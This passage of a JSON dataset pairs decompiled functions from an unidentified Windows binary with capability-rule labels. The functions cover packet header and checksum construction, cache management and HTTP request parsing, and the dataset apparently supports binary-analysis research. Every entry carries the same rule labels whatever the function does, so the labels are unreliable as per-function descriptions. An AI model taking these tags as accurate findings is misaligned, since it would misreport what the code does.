0x10) = *(arg_8h + 0x10) + -4;\n        var_38h = fcn.000356f0(*(arg_8h + 0x10) + 0x400);\n        if (var_38h == NULL) {\n            return;\n        }\n        var_20h = var_38h + *(arg_8h + 0x10);\n        var_24h = var_20h + 0x200;\n        var_40h = *(arg_8h + 0x30) + 4;\n        *var_24h = *(arg_8h + 0x28);\n        fcn.00078be8(var_20h + 0x204, *(arg_8h + 0x2c), *(arg_8h + 0x30));\n        iVar4 = fcn.000691b0(var_24h, var_40h, *(arg_8h + 0x14), *(arg_8h + 0x18), (*(arg_8h + 0x20) & 2) != 0, var_20h\n                             , &var_30h);\n        if (iVar4 == 0) goto code_r0x00049615;\n        *(arg_8h + 0x18) = var_30h;\n    }\n    fcn.00078be8(var_38h, *(arg_8h + 0xc), *(arg_8h + 0x10));\n    if ((*(arg_8h + 0x20) & 0x10) == 0) {\n        fcn.00078be8(var_38h + *(arg_8h + 0x10), *(arg_8h + 0x14), *(arg_8h + 0x18));\n    }\n    var_3ch = var_38h;\n    var_18h = *(arg_8h + 0x10);\n    if (var_18h < 0xe) goto code_r0x00049615;\n    var_44h = var_38h;\n    var_3ch = var_38h + 0xe;\n    var_18h = var_18h - 0xe;\n    fcn.00049650(var_38h + 6, var_38h, 6);\n    iVar2 = fcn.00035980(CONCAT22(extraout_var, *(var_44h + 3)));\n    if (iVar2 == 0x800) {\n        if (var_18h < 0x14) goto code_r0x00049615;\n        var_8h = var_3ch;\n        uVar5 = *var_3ch & 0xf;\n        arg_ch = uVar5 * 4;\n        if ((arg_ch < 0x14) || (var_18h < arg_ch)) goto code_r0x00049615;\n        var_18h = var_18h + uVar5 * -4;\n        puVar7 = var_3ch + 3;\n        arg_8h_00 = var_3ch + 4;\n        var_3ch = var_3ch + uVar5;\n        fcn.00049650(arg_8h_00, puVar7, 4);\n        *(var_8h + 6) = 0;\n        *(var_8h + 2) = 0x80;\n        *0x800cd98c = *0x800cd98c + 1;\n        uVar3 = fcn.00035980(var_8h & 0xffff0000 | *0x800cd98c);\n        *(var_8h + 1) = uVar3;\n        uVar3 = fcn.00035980(*(arg_8h + 0x10) + -0xe + *(arg_8h + 0x18));\n        *(var_8h + 2) = uVar3;\n        *(var_8h + 10) = 0;\n        uVar3 = fcn.000477b0(var_8h, arg_ch);\n        *(var_8h + 10) = uVar3;\n        uVar1 = *(var_8h + 9);\n        if (uVar1 == 1) {\n            if (var_18h < 4) goto code_r0x00049615;\n            var_28h = var_3ch;\n            var_34h = var_18h;\n            if (*var_3ch - 8 < 10) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *var_3ch = 3;\n            *(var_3ch + 1) = 1;\n            puVar7 = var_3ch + 1;\n            uVar5 = var_18h - 4;\n            if ((*(arg_8h + 0x20) & 1) != 0) {\n                if ((*(arg_8h + 0x20) & 8) != 0) {\n                    *puVar7 = *(arg_8h + 0x28);\n                    puVar7 = var_3ch + 2;\n                    uVar5 = var_18h - 8;\n                }\n                var_18h = uVar5;\n                var_3ch = puVar7;\n                var_2ch = fcn.00035950(*var_3ch);\n                var_2ch = var_2ch & 0xbfffffff;\n                if ((*(arg_8h + 0x20) & 2) != 0) {\n                    var_2ch = var_2ch | 0x40000000;\n                }\n                uVar6 = fcn.00035950(var_2ch);\n                *var_3ch = uVar6;\n                puVar7 = var_3ch;\n                uVar5 = var_18h;\n            }\n            var_18h = uVar5;\n            var_3ch = puVar7;\n            *(var_28h + 2) = 0;\n            uVar3 = fcn.00047d90(var_28h, var_34h + *(arg_8h + 0x18));\n            *(var_28h + 2) = uVar3;\n        }\n        else if (uVar1 == 6) {\n            if (var_18h < 0x14) goto code_r0x00049615;\n            var_1ch = var_3ch;\n            iVar4 = (*(var_3ch + 3) & 0xf0) >> 4;\n            fcn.00049650(var_3ch + 2, var_3ch, 2);\n            var_50h = var_8h[3];\n            var_4ch = var_8h[4];\n            var_48h._0_1_ = 0;\n            var_48h._1_1_ = *(var_8h + 9);\n            var_48h._2_2_ = fcn.00035980(var_18h + *(arg_8h + 0x18));\n            *(var_1ch + 4) = 0;\n            uVar3 = fcn.000478b0(&var_50h, var_1ch, var_18h + *(arg_8h + 0x18));\n            *(var_1ch + 4) = uVar3;\n            var_3ch = var_3ch + iVar4;\n            var_18h = var_18h + iVar4 * -4;\n        }\n        else if (uVar1 == 0x11) {\n            if (var_18h < 8) goto code_r0x00049615;\n            var_4h = var_3ch;\n            fcn.00049650(var_3ch + 2, var_3ch, 2);\n            uVar3 = fcn.00035980(*(arg_8h + 0x18) + 8);\n            *(var_4h + 1) = uVar3;\n            var_14h = var_8h[3];\n            var_10h = var_8h[4];\n            var_ch._0_1_ = 0;\n            var_ch._1_1_ = *(var_8h + 9);\n            var_ch._2_2_ = *(var_4h + 1);\n            *(var_4h + 6) = 0;\n            uVar5 = fcn.00035980(var_8h & 0xffff0000 | *(var_4h + 1));\n            uVar3 = fcn.00047b40(&var_14h, var_4h, uVar5 & 0xffff);\n            *(var_4h + 6) = uVar3;\n            var_3ch = var_3ch + 2;\n            var_18h = var_18h - 8;\n        }\n    }\n    if (*(arg_8h + 0x10) + *(arg_8h + 0x18) < 0x3c) {\n        fcn.00078bfa(var_38h + *(arg_8h + 0x18) + *(arg_8h + 0x10), 0, 0x3c - (*(arg_8h + 0x10) + *(arg_8h + 0x18)));\n    }\n    if (*(arg_8h + 4) == 0) {\n        if (*(arg_8h + 8) != 0) {\n            if (*(arg_8h + 0x10) + *(arg_8h + 0x18) < 0x3d) {\n                var_68h = 0x3c;\n            }\n            else {\n                var_68h = *(arg_8h + 0x10) + *(arg_8h + 0x18);\n            }\n            (**0x800ce94c)(*(arg_8h + 8), var_38h, var_68h);\n        }\n    }\n    else {\n        if (*(arg_8h + 0x10) + *(arg_8h + 0x18) < 0x3d) {\n            var_64h = 0x3c;\n        }\n        else {\n            var_64h = *(arg_8h + 0x10) + *(arg_8h + 0x18);\n        }\n        (**0x800ce948)(*(arg_8h + 4), var_38h, var_64h);\n    }\ncode_r0x00049615:\n    fcn.000357f0(var_38h);\n    return;\n}\n",
        "token_count": 2879
    },
    "000496b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000496b0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00037640(0x800cd954, &var_4h, 1);\n    iVar1 = fcn.00026ff0();\n    var_8h = NULL;\n    var_14h = *0x800cd984;\n    while (var_14h != NULL) {\n        if (iVar1 - var_14h[9] < 0xea61) {\n            var_8h = var_14h;\n            var_14h = *var_14h;\n        }\n        else {\n            puVar2 = *var_14h;\n            *0x800cd988 = *0x800cd988 - (var_14h[6] + 0x34 + var_14h[4]);\n            puVar4 = puVar2;\n            if (var_8h != NULL) {\n                *var_8h = puVar2;\n                puVar4 = *0x800cd984;\n            }\n            *0x800cd984 = puVar4;\n            if (puVar2 == NULL) {\n                *0x800cd998 = var_8h;\n            }\n            fcn.000357f0(var_14h);\n            var_14h = puVar2;\n        }\n    }\n    fcn.00037670(0x800cd954, &var_4h, 1);\n    puVar2 = fcn.000356f0(arg_8h[6] + 0x34 + arg_8h[4]);\n    if (puVar2 == NULL) {\n        var_18h = 0;\n    }\n    else {\n        puVar4 = arg_8h;\n        puVar5 = puVar2;\n        for (iVar1 = 0xd; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        puVar2[3] = puVar2 + 0xd;\n        puVar2[5] = puVar2[3] + puVar2[4];\n        fcn.00078be8(puVar2[3], arg_8h[3], arg_8h[4]);\n        fcn.00078be8(puVar2[5], arg_8h[5], arg_8h[6]);\n        uVar3 = fcn.00026ff0();\n        puVar2[9] = uVar3;\n        *puVar2 = 0;\n        fcn.00037640(0x800cd954, &var_4h, 1);\n        if (*0x800cd988 + 0x34 + arg_8h[6] + arg_8h[4] < 0x20001) {\n            puVar4 = puVar2;\n            if (*0x800cd984 != NULL) {\n                **0x800cd998 = puVar2;\n                puVar4 = *0x800cd984;\n            }\n            *0x800cd984 = puVar4;\n            *0x800cd988 = puVar2[6] + 0x34 + puVar2[4] + *0x800cd988;\n            var_18h = 1;\n            *0x800cd998 = puVar2;\n        }\n        else {\n            var_18h = 0;\n        }\n        fcn.00037670(0x800cd954, &var_4h, 1);\n    }\n    return var_18h;\n}\n",
        "token_count": 880
    },
    "000498c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t ** __cdecl fcn.000498c0(int32_t arg_8h)\n\n{\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    int32_t **var_ch;\n    int32_t **var_8h;\n    uint var_4h;\n    \n    fcn.00037640(0x800cd954, &var_4h, 1);\n    var_8h = NULL;\n    for (var_ch = *0x800cd984; var_ch != NULL; var_ch = *var_ch) {\n        if (var_ch[4] == *(arg_8h + 0x10)) {\n            var_14h = *(arg_8h + 0xc);\n            var_18h = var_ch[3];\n            for (var_10h = *(arg_8h + 0x10); 3 < var_10h; var_10h = var_10h - 4) {\n                if (*var_18h != *var_14h) goto code_r0x00049951;\n                var_14h = var_14h + 1;\n                var_18h = var_18h + 1;\n            }\n            if (var_10h == 0) {\ncode_r0x000499d3:\n                var_20h = 0;\n            }\n            else {\ncode_r0x00049951:\n                var_1ch = *var_18h - *var_14h;\n                if (var_1ch == 0) {\n                    if (var_10h == 1) goto code_r0x000499d3;\n                    var_1ch = *(var_18h + 1) - *(var_14h + 1);\n                    if (var_1ch == 0) {\n                        if (var_10h == 2) goto code_r0x000499d3;\n                        var_1ch = *(var_18h + 2) - *(var_14h + 2);\n                        if (var_1ch == 0) {\n                            if ((var_10h == 3) || (var_1ch = *(var_18h + 3) - *(var_14h + 3),  var_1ch == 0))\n                            goto code_r0x000499d3;\n                        }\n                    }\n                }\n                var_20h = 1;\n                if (var_1ch < 1) {\n                    var_20h = -1;\n                }\n            }\n            if (var_20h == 0) break;\n        }\n        var_8h = var_ch;\n    }\n    if (var_ch != NULL) {\n        if (var_8h == NULL) {\n            *0x800cd984 = *var_ch;\n        }\n        else {\n            *var_8h = *var_ch;\n        }\n        if (*var_ch == NULL) {\n            *0x800cd998 = var_8h;\n        }\n        *var_ch = NULL;\n        *0x800cd988 = *0x800cd988 - (var_ch[6] + 0xd + var_ch[4]);\n    }\n    fcn.00037670(0x800cd954, &var_4h, 1);\n    return var_ch;\n}\n",
        "token_count": 757
    },
    "00049a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00049a80(uint arg_8h, uint arg_ch, uint8_t *arg_10h, char *arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_1ch;\n    uint var_14h;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.00068e20(arg_8h, arg_ch, &var_ch, arg_14h, &var_4h);\n    if (iVar2 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        if (var_4h == 0) {\n            *arg_18h = var_8h & 0x1f;\n            *arg_1ch = var_ch._3_1_;\n            *arg_10h = -((var_8h >> 5 & 1) != 0) & 2U | 0x11 | -((var_8h >> 6 & 1) != 0) & 4U;\n        }\n        else {\n            var_10h = arg_14h;\n            do {\n                cVar1 = *var_10h;\n                var_10h = var_10h + 1;\n            } while (cVar1 != '\\0');\n            *arg_18h = var_10h - (arg_14h + 1);\n            *arg_10h = 0x60;\n        }\n        uVar3 = 8;\n    }\n    return uVar3;\n}\n",
        "token_count": 393
    },
    "00049c10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00049c10(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint *arg_1ch, uint *arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_d8h;\n    int32_t var_d4h;\n    int32_t var_d0h;\n    int32_t *var_cch;\n    int32_t *var_c8h;\n    uint32_t var_c4h;\n    uint var_c0h;\n    int32_t var_bch;\n    int32_t var_b8h;\n    int32_t *var_b4h;\n    int32_t *var_b0h;\n    uint32_t var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    int32_t var_a0h;\n    int32_t *var_9ch;\n    int32_t *var_98h;\n    uint32_t var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t *var_84h;\n    int32_t *var_80h;\n    uint32_t var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t *var_6ch;\n    int32_t *var_68h;\n    uint32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t *var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t *var_3ch;\n    int32_t *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    for (; (*arg_8h == 10 || ((*arg_8h == 0xd && (*(arg_8h + 1) == 10)))); arg_8h = arg_8h + 1) {\n        arg_ch = arg_ch + -1;\n    }\n    iVar1 = fcn.00078b7c(arg_8h, 10, arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_14h = iVar1 - arg_8h;\n    iVar1 = var_14h + 1;\n    if ((var_14h != 0) && (*(arg_8h + (var_14h - 1)) == 0xd)) {\n        var_14h = var_14h - 1;\n    }\n    if (var_14h < 0xe) {\n        return 0;\n    }\n    iVar2 = fcn.00078b7c(arg_8h, 0x20, var_14h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = iVar2 - arg_8h;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if (iVar2 == 3) {\n        var_38h = 0x80055244;\n        var_3ch = arg_8h;\n        for (var_34h = 3; 3 < var_34h; var_34h = var_34h - 4) {\n            if (*var_3ch != *var_38h) goto code_r0x00049d33;\n            var_38h = var_38h + 1;\n            var_3ch = var_3ch + 1;\n        }\n        if (var_34h == 0) {\ncode_r0x00049db5:\n            var_44h = 0;\n        }\n        else {\ncode_r0x00049d33:\n            var_40h = *var_3ch - *var_38h;\n            if (var_40h == 0) {\n                if (var_34h == 1) goto code_r0x00049db5;\n                var_40h = *(var_3ch + 1) - *(var_38h + 1);\n                if (var_40h == 0) {\n                    if (var_34h == 2) goto code_r0x00049db5;\n                    var_40h = *(var_3ch + 2) - *(var_38h + 2);\n                    if (var_40h == 0) {\n                        if ((var_34h == 3) || (var_40h = *(var_3ch + 3) - *(var_38h + 3),  var_40h == 0))\n                        goto code_r0x00049db5;\n                    }\n                }\n            }\n            var_44h = 1;\n            if (var_40h < 1) {\n                var_44h = -1;\n            }\n        }\n        if (var_44h != 0) goto code_r0x00049de2;\n    }\n    else {\ncode_r0x00049de2:\n        if (iVar2 != 4) {\n            return 0;\n        }\n        var_50h = 0x80055248;\n        var_54h = arg_8h;\n        for (var_4ch = 4; 3 < var_4ch; var_4ch = var_4ch - 4) {\n            if (*var_54h != *var_50h) goto code_r0x00049e2a;\n            var_50h = var_50h + 1;\n            var_54h = var_54h + 1;\n        }\n        if (var_4ch == 0) {\ncode_r0x00049eac:\n            var_5ch = 0;\n        }\n        else {\ncode_r0x00049e2a:\n            var_58h = *var_54h - *var_50h;\n            if (var_58h == 0) {\n                if (var_4ch == 1) goto code_r0x00049eac;\n                var_58h = *(var_54h + 1) - *(var_50h + 1);\n                if (var_58h == 0) {\n                    if (var_4ch == 2) goto code_r0x00049eac;\n                    var_58h = *(var_54h + 2) - *(var_50h + 2);\n                    if (var_58h == 0) {\n                        if ((var_4ch == 3) || (var_58h = *(var_54h + 3) - *(var_50h + 3),  var_58h == 0))\n                        goto code_r0x00049eac;\n                    }\n                }\n            }\n            var_5ch = 1;\n            if (var_58h < 1) {\n                var_5ch = -1;\n            }\n        }\n        if (var_5ch != 0) {\n            return 0;\n        }\n    }\n    iVar5 = iVar2 + 1;\n    iVar3 = fcn.00078b7c(arg_8h + iVar5, 0x20, arg_ch - iVar5);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar6 = iVar3 - (arg_8h + iVar5);\n    if (uVar6 == 0) {\n        return 0;\n    }\n    if (*(arg_8h + iVar5) != 0x2f) {\n        if (uVar6 < 8) {\n            return 0;\n        }\n        var_68h = 0x80055250;\n        var_6ch = arg_8h + iVar5;\n        for (var_64h = 7; 3 < var_64h; var_64h = var_64h - 4) {\n            if (*var_6ch != *var_68h) goto code_r0x00049f81;\n            var_68h = var_68h + 1;\n            var_6ch = var_6ch + 1;\n        }\n        if (var_64h == 0) {\ncode_r0x0004a003:\n            var_74h = 0;\n        }\n        else {\ncode_r0x00049f81:\n            var_70h = *var_6ch - *var_68h;\n            if (var_70h == 0) {\n                if (var_64h == 1) goto code_r0x0004a003;\n                var_70h = *(var_6ch + 1) - *(var_68h + 1);\n                if (var_70h == 0) {\n                    if (var_64h == 2) goto code_r0x0004a003;\n                    var_70h = *(var_6ch + 2) - *(var_68h + 2);\n                    if (var_70h == 0) {\n                        if ((var_64h == 3) || (var_70h = *(var_6ch + 3) - *(var_68h + 3),  var_70h == 0))\n                        goto code_r0x0004a003;\n                    }\n                }\n            }\n            var_74h = 1;\n            if (var_70h < 1) {\n                var_74h = -1;\n            }\n        }\n        if (var_74h != 0) {\n            return 0;\n        }\n    }\n    iVar2 = iVar2 + 2 + uVar6;\n    if (var_14h - iVar2 != 8) {\n        return 0;\n    }\n    var_80h = 0x80055258;\n    var_84h = arg_8h + iVar2;\n    for (var_7ch = 5; 3 < var_7ch; var_7ch = var_7ch - 4) {\n        if (*var_84h != *var_80h) goto code_r0x0004a09c;\n        var_80h = var_80h + 1;\n        var_84h = var_84h + 1;\n    }\n    if (var_7ch == 0) {\ncode_r0x0004a143:\n        var_8ch = 0;\n    }\n    else {\ncode_r0x0004a09c:\n        var_88h = *var_84h - *var_80h;\n        if (var_88h == 0) {\n            if (var_7ch == 1) goto code_r0x0004a143;\n            var_88h = *(var_84h + 1) - *(var_80h + 1);\n            if (var_88h == 0) {\n                if (var_7ch == 2) goto code_r0x0004a143;\n                var_88h = *(var_84h + 2) - *(var_80h + 2);\n                if (var_88h == 0) {\n                    if ((var_7ch == 3) || (var_88h = *(var_84h + 3) - *(var_80h + 3),  var_88h == 0))\n                    goto code_r0x0004a143;\n                }\n            }\n        }\n        var_8ch = 1;\n        if (var_88h < 1) {\n            var_8ch = -1;\n        }\n    }\n    if (var_8ch == 0) {\n        if (*(arg_8h + iVar2 + 6) == 0x2e) {\n            iVar2 = fcn.0006c470(arg_8h + iVar1, arg_ch - iVar1, arg_18h, arg_10h, arg_14h);\n            if (iVar2 == 0) {\n                uVar4 = 0;\n            }\n            else {\n                if ((arg_1ch != NULL) || (arg_20h != NULL)) {\n                    if (arg_1ch != NULL) {\n                        *arg_1ch = 0;\n                    }\n                    if (arg_20h != NULL) {\n                        *arg_20h = 0;\n                    }\ncode_r0x0004a1f9:\n                    var_2ch = iVar1;\n                    var_18h = fcn.00078b7c(arg_8h + var_2ch, 10, var_14h - var_2ch);\n                    if (var_18h != 0) {\n                        var_18h = var_18h - arg_8h;\n                        iVar1 = var_18h + 1;\n                        if ((var_18h != 0) && (*(arg_8h + var_18h + -1) == 0xd)) {\n                            var_18h = var_18h + -1;\n                        }\n                        iVar2 = fcn.00078b7c(arg_8h + var_2ch, 0x3a, var_18h - var_2ch);\n                        if (iVar2 == 0) goto code_r0x0004a73d;\n                        var_ach = iVar2 - (arg_8h + var_2ch);\n                        if ((arg_1ch != NULL) && (var_ach == 0xe)) {\n                            var_98h = 0x800cad20;\n                            var_9ch = arg_8h + var_2ch;\n                            for (var_94h = var_ach; 3 < var_94h; var_94h = var_94h - 4) {\n                                if (*var_9ch != *var_98h) goto code_r0x0004a2f5;\n                                var_98h = var_98h + 1;\n                                var_9ch = var_9ch + 1;\n                            }\n                            if (var_94h == 0) {\ncode_r0x0004a3cb:\n                                var_a4h = 0;\n                            }\n                            else {\ncode_r0x0004a2f5:\n                                var_a0h = *var_9ch - *var_98h;\n                                if (var_a0h == 0) {\n                                    if (var_94h == 1) goto code_r0x0004a3cb;\n                                    var_a0h = *(var_9ch + 1) - *(var_98h + 1);\n                                    if (var_a0h == 0) {\n                                        if (var_94h == 2) goto code_r0x0004a3cb;\n                                        var_a0h = *(var_9ch + 2) - *(var_98h + 2);\n                                        if (var_a0h == 0) {\n                                            if ((var_94h == 3) ||\n                                               (var_a0h = *(var_9ch + 3) - *(var_98h + 3),  var_a0h == 0))\n                                            goto code_r0x0004a3cb;\n                                        }\n                                    }\n                                }\n                                var_a4h = 1;\n                                if (var_a0h < 1) {\n                                    var_a4h = -1;\n                                }\n                            }\n                            if (var_a4h == 0) {\n                                uVar4 = fcn.00036370(iVar2 + 2, 0, 0);\n                                *arg_1ch = uVar4;\n                                goto code_r0x0004a1f9;\n                            }\n                        }\n                        if ((arg_20h != NULL) && (var_ach == 10)) {\n                            var_b0h = 0x800b94ac;\n                            var_b4h = arg_8h + var_2ch;\n                            for (; 3 < var_ach; var_ach = var_ach - 4) {\n                                if (*var_b4h != *var_b0h) goto code_r0x0004a49e;\n                                var_b0h = var_b0h + 1;\n                                var_b4h = var_b4h + 1;\n                            }\n                            if (var_ach == 0) {\ncode_r0x0004a574:\n                                var_bch = 0;\n                            }\n                            else {\ncode_r0x0004a49e:\n                                var_b8h = *var_b4h - *var_b0h;\n                                if (var_b8h == 0) {\n                                    if (var_ach == 1) goto code_r0x0004a574;\n                                    var_b8h = *(var_b4h + 1) - *(var_b0h + 1);\n                                    if (var_b8h == 0) {\n                                        if (var_ach == 2) goto code_r0x0004a574;\n                                        var_b8h = *(var_b4h + 2) - *(var_b0h + 2);\n                                        if (var_b8h == 0) {\n                                            if ((var_ach == 3) ||\n                                               (var_b8h = *(var_b4h + 3) - *(var_b0h + 3),  var_b8h == 0))\n                                            goto code_r0x0004a574;\n                                        }\n                                    }\n                                }\n                                var_bch = 1;\n                                if (var_b8h < 1) {\n                                    var_bch = -1;\n                                }\n                            }\n                            if (var_bch == 0) {\n                                var_c8h = 0x80055260;\n                                var_cch = iVar2 + 2;\n                                for (var_c4h = 5; 3 < var_c4h; var_c4h = var_c4h - 4) {\n                                    if (*var_cch != *var_c8h) goto code_r0x0004a615;\n                                    var_c8h = var_c8h + 1;\n                                    var_cch = var_cch + 1;\n                                }\n                                if (var_c4h == 0) {\ncode_r0x0004a6eb:\n                                    var_d4h = 0;\n                                }\n                                else {\ncode_r0x0004a615:\n                                    var_d0h = *var_cch - *var_c8h;\n                                    if (var_d0h == 0) {\n                                        if (var_c4h == 1) goto code_r0x0004a6eb;\n                                        var_d0h = *(var_cch + 1) - *(var_c8h + 1);\n                                        if (var_d0h == 0) {\n                                            if (var_c4h == 2) goto code_r0x0004a6eb;\n                                            var_d0h = *(var_cch + 2) - *(var_c8h + 2);\n                                            if (var_d0h == 0) {\n                                                if ((var_c4h == 3) ||\n                                                   (var_d0h = *(var_cch + 3) - *(var_c8h + 3),  var_d0h == 0))\n                                                goto code_r0x0004a6eb;\n                                            }\n                                        }\n                                    }\n                                    var_d4h = 1;\n                                    if (var_d0h < 1) {\n                                        var_d4h = -1;\n                                    }\n                                }\n                                if (var_d4h == 0) {\n                                    *arg_20h = 1;\n                                }\n                            }\n                        }\n                        goto code_r0x0004a1f9;\n                    }\n                }\ncode_r0x0004a73d:\n                uVar4 = 1;\n            }\n        }\n        else {\n            uVar4 = 0;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 4508
    },
    "0004a750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_684h\n// WARNING: Variable defined which should be unmapped: var_680h\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0004a750(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_684h;\n    int32_t var_680h;\n    uint var_5fch;\n    uint var_5f8h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_14h = 0;\n    fcn.00078ad4(&var_680h, 0x80055268, *(arg_8h + 0x20), *(arg_8h + 0x21), *(arg_8h + 0x22), *(arg_8h + 0x23), \n                 *(arg_8h + 0x24));\n    var_ch = fcn.000356f0(0xbd0);\n    if (var_ch != NULL) {\n        fcn.00078bfa(var_ch, 0, 0xbd0);\n        *var_ch = *(arg_8h + 0x10);\n        var_ch[1] = *(arg_8h + 0x14);\n        if (*(arg_8h + 0x610) < 0xbb9) {\n            var_ch[3] = 0;\n            var_ch[2] = *(arg_8h + 0x610) % 3000;\n            var_ch[4] = *(arg_8h + 0x610);\n            fcn.00078be8(var_ch + 5, arg_8h + 0x34, *(arg_8h + 0x610));\n            while( true ) {\n                var_684h = 0;\n                iVar1 = fcn.0004b5f0(&var_5f8h, &var_684h, var_ch);\n                if ((iVar1 == 0) ||\n                   (iVar1 = fcn.00049c10(&var_5f8h, var_684h, &var_14h, &var_10h, &var_8h, &var_18h, var_ch + 0x2f3), \n                   iVar1 == 0)) break;\n                if ((var_2h & 1) != 0) {\n                    fcn.0004b790(&var_5f8h, var_684h, &var_680h, 1, 0);\n                }\n                var_680h = var_10h + -8;\n                var_684h = var_14h + 8;\n                iVar1 = fcn.0006c680(&var_8h, var_684h, var_680h, &var_680h, var_18h, var_ch);\n                if ((iVar1 != 0) || ((var_ch[0x2f3] & 1) != 0)) break;\n                fcn.000357f0(var_14h);\n                var_14h = 0;\n            }\n        }\n    }\n    fcn.000357f0(var_14h);\n    fcn.000357f0(var_ch);\n    fcn.000531d0(*(arg_8h + 0x10), *(arg_8h + 0x14));\n    fcn.00053350(arg_8h);\n    return 0;\n}\n",
        "token_count": 811
    },
    "0004a990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004a990(int32_t arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint var_254h;\n    uint var_24ch;\n    uint *var_248h;\n    uint var_244h;\n    uint var_23ch;\n    uint *var_238h;\n    uint var_234h;\n    uint var_230h;\n    int32_t var_1ach;\n    int32_t var_1a8h;\n    uint *var_1a4h;\n    uint var_1a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    var_1ach = arg_8h;\n    var_10h = 0;\n    var_1a4h = NULL;\n    fcn.00078ad4(&var_230h, 0x80055268, *(arg_8h + 0x20), *(arg_8h + 0x21), *(arg_8h + 0x22), *(arg_8h + 0x23), \n                 *(arg_8h + 0x24));\n    var_1a8h = var_1ach + 0x34;\n    iVar3 = *(var_1ach + 0x610);\n    fcn.0004b790(var_1a8h, iVar3, &var_230h, 0, &var_10h);\n    if (*(var_1ach + 0x18) == 6) {\n        fcn.00078ad4(&var_98h, 0x80055278, 0xd, 0x800cb190);\n        var_238h = &var_98h;\n        do {\n            cVar1 = *var_238h;\n            var_238h = var_238h + 1;\n        } while (cVar1 != '\\0');\n        fcn.00053270(*(var_1ach + 0x10), *(var_1ach + 0x14), &var_98h, var_238h - (&var_98h + 1));\n    }\n    else {\n        pcVar2 = fcn.00078b7c(var_1a8h + 5, 0x3f, iVar3 + -5);\n        var_4h = pcVar2;\n        if (((pcVar2 != NULL) && (var_4h = pcVar2 + 0xb,  *var_4h == '&')) && (pcVar2[0xc] == 'a')) {\n            